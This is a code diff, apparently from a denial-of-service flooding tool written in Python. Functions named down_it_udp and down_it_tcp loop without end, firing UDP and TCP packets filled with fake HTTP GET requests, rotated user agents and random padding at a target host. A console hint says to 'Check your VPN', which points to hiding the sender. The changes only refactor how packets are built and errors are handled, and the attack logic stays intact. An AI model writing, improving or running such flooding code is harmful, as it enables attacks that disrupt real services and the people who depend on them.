@@ -50,20 +50,19 @@ def down_it_udp():
     i = 1
     while True:
         if random_packet_len:
-            extra_data = get_random_string(0, 50000)
+            extra_data = get_random_string(0, 1000)
         else:
             extra_data = ''
-        packet = str(
-            "GET / HTTP/1.1"
-            + "\nHost: " + host
-            + "\nUser-Agent: " + random.choice(uagent)
-            + "\n" + data
-            + "\n\n" + extra_data).encode('utf-8')
+        packet = ("GET / HTTP/1.1"
+                  + "\nHost: " + host
+                  + "\nUser-Agent: " + random.choice(uagent)
+                  + data
+                  + "\n\n" + extra_data)
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.settimeout(5)
         p = int(port) if port else get_random_port()
         try:
-            s.sendto(packet, (host, p))
+            s.sendto(packet.encode('utf-8'), (host, p))
         except socket.gaierror:
             print("\033[91m Can't get server IP. Packet sending failed. Check your VPN.\033[0m")
         except BaseException as e:
@@ -79,7 +78,7 @@ def down_it_udp():
             except BaseException as e:
                 if error_debug:
                     print("\033[91m Error: " + str(e) + ".\033[0m")
-                print("\033[91m Socket close failed.\033[0m")
+                    print("\033[91m Socket close failed.\033[0m")
         time.sleep(.03)
 
         if port:
@@ -131,10 +130,11 @@ def down_it_http():
 
 def down_it_tcp():
     while True:
-        packet = str(
-            "GET " + resource + " HTTP/1.1"
-            + "\nHost: " + host
-            + "\n User-Agent: " + random.choice(uagent) + "\n" + data).encode('utf-8')
+        packet = ("GET / HTTP/1.1"
+                  + "\nHost: " + host
+                  + "\nUser-Agent: " + random.choice(uagent)
+                  + data
+                  + "\n\n").encode('utf-8')
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(5)
         try:
@@ -156,10 +156,10 @@ def down_it_tcp():
             try:
                 s.close()
                 s.shutdown(1)
-            except:
+            except BaseException as e:
                 if error_debug:
                     print("\033[91m Error: " + str(e) + ".\033[0m")
-                print("\033[91m Socket close failed.\033[0m")
+                    print("\033[91m Socket close failed.\033[0m")
 
         time.sleep(.01)
 
